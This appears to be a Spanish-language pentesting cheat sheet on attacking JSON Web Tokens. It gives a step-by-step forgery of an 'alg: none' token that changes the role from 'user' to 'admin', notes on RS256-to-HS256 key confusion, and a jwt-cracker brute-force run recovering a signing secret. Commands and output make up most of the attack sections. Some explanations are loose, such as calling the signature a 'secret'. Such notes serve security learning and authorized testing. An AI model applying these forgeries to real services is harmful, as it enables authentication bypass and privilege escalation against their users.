# Json Web Token's

## Estructura básica
```
header.payload.secret
```

El secreto es solo conocido por el servidor y es usado para asegurarse de que los datos no fueron cambiados a lo largo del camino. Todo esta codificado en Base64. Un ejemplo de un token JWT sería:
```
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
```

Si podemos controlar la parte de _secret_ podemos controlar los datos. Para poder hacerlo tenemos que entender como se calcula en secretp. Esto requiere el conocimiento de la estructura del _header_, típicamente luce como:
```
{"typ":"JWT","alg":"RS256"}
```
Estarémos intereados en el campo _alg_. RS256 usa una llave privada RSA que solo esta disponible en el servidor. Sin embargo, podemos cambiar el campo a HS256, el cual es calculado usando la _llave pública_ del serviror, la cual en ciertas circunstancias la podríamos acceder también.

## Algoritmos de encripción

- RS256
- HS256
- None



## Explotación manual cuando se tiene llave púbica

- Convertir llave publica a hex para poder usarla con openssl
```
cat public.pem | xxd -p | tr -d "\\n"
```

## Explotación del algoritmo None

- Token original
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjEwNDE0MTg2NDQyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDExXzFfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg3LjAuNDI4MC4xNDEgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjEwNDE0MTg2fQ
```
- Decodificamos parte 1
```
echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d
{"typ":"JWT","alg":"HS256"}
```

- Modificamos y recodificamos para tener parte1
```
echo '{"typ":"JWT","alg":"none"}' | base64 
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K
```

- Decodificamos parte 2
```
echo -n eyJhdXRoIjoxNjEwNDE0MTg2NDQyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDExXzFfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg3LjAuNDI4MC4xNDEgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjEwNDE0MTg2fQ | base64 -d
{"auth":1610414186442,"agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36","role":"user","iat":1610414186}base64: invalid input
```

- Modificamos y recodificamos para tener parte2
```
echo '{"auth":1610414186442,"agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36","role":"admin","iat":1610414186}' | base64
eyJhdXRoIjoxNjEwNDE0MTg2NDQyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IElu
dGVsIE1hYyBPUyBYIDExXzFfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNr
bykgQ2hyb21lLzg3LjAuNDI4MC4xNDEgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlh
dCI6MTYxMDQxNDE4Nn0K
```
- pegamos parte 1 y parte 2 : parte1.parte2
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.eyJhdXRoIjoxNjEwNDE0MTg2NDQyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDExXzFfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg3LjAuNDI4MC4xNDEgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxMDQxNDE4Nn0K.
```

- comprobar en : `https://jwt.io/`


## Ataque de fuerza bruta al secret del JWT token
```
jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE abcdefghijklmnopqrstvwxyz 4
Attempts: 100000
Attempts: 200000
Attempts: 300000
SECRET FOUND: pass
Time taken (sec): 4.906
Attempts: 308791

```





## Referencias
- [JWT RFC](https://tools.ietf.org/html/rfc7519)
- [PayloadsAllTheThings JWT Json Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [jwt-cracker](https://github.com/lmammino/jwt-cracker)



